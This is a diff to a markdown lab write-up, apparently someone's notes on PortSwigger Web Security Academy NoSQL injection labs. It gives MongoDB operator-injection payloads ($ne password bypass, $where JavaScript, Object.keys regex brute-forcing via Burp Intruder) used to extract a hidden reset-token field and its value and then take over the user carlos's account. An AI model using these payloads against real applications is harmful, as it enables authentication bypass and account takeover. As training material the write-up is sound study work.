@@ -89,6 +89,7 @@ Send the post/login request to repeater
 
 
 
+
 In Repeater, test the username and password parameters to determine whether they allow you to inject MongoDB operators: 
 
 From <https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication> 
@@ -249,5 +250,114 @@ From <https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-e
 
 Our password
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e29a0e4a-6495-40aa-9924-1b12fe78d6f8)
+
+**Exploiting operator injection to extract unknown fields**
+
+From <https://0a2e00110417736f805bb71d003a00c8.web-security-academy.net/> 
+
+
+Attempt to sign in 
+Send request to repeater
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f040564a-5f59-4fe0-8d02-345f9226f184)
+
+
+Check vuln
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
+```
+
+From <https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields> 
+
+Account still not log in
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ebcf1c25-c256-4e2d-8d07-be1242f4dcf9)
+
+
+
+Change "$where": "0" to "$where": "1", then resend the request. Notice that you receive an Account locked error message. This indicates that the JavaScript in the $where clause is being evaluated.
+
+From <https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6e66aa45-db99-4525-982f-3990acb18f71)
+
+
+
+Send following get request to repeater
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9c5b8ea4-d2aa-4b4a-9df2-762e3c1b9fd0)
+
+
+Send the following request to intruder
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5fe7812d-6cd7-4bb9-b543-1b34ca0a2143)
+
+
+
+Find out what is our token name for restoring your password
+
+
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{}.*')"}
+```
+
+Add two payload position
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
+```
+
+Set the attack type to Cluster bomb.
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6f939657-645b-4632-9a5e-c42417e9f622)
+
+
+First payload
+```
+Number 0-20
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6d7af500-d053-4c28-9c21-d4870b9560e7)
+
+
+
+Second payload 
+```
+a-z
+A-Z
+0-9
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c9a73a5b-7da4-4dd0-b9ac-1cc17c1ee1c9)
+
+
+Start attack
+Spell out username
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[2].match('^.{§§}§§.*')"}
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8de911a4-8187-437f-9e4d-86a90ac2f4c2)
+
+
+
+We need the token name so change the key to [3]
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[3].match('^.{§§}§§.*')"}
+```
+
+Obviously unlockToken
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32c976ec-96e4-4328-8f81-a482eba01c39)
+
+
+
+
+
+We now need to get the value of our token password change 
+{"username":"carlos","password":{"$ne":"invalid"},  "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"}
+
+From <https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields> 
+
+
+
+
+Start our attack
+Our token is listed just 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bcf3c9cc-34c1-4c22-9ca4-97e9fc12d4a9)
+
+
+Replace token to reset password
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29f25c4a-9ed1-48a2-9bbe-183f1cf10879)
+
 
 
